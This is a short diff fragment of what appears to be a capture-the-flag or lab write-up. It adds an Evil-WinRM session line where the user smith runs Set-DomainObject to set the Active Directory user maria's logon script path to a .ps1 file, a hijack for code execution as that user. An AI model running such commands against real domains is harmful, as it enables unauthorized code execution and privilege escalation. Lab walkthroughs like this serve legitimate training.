@@ -458,3 +458,10 @@ d-----        8/25/2021   2:57 AM                VMware
 *Evil-WinRM* PS C:\Users\smith\Documents> 
 ```
 
+```python
+*Evil-WinRM* PS C:\Users\smith\Documents> Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\maria.ps1"}
+```
+
+```python
+
+```
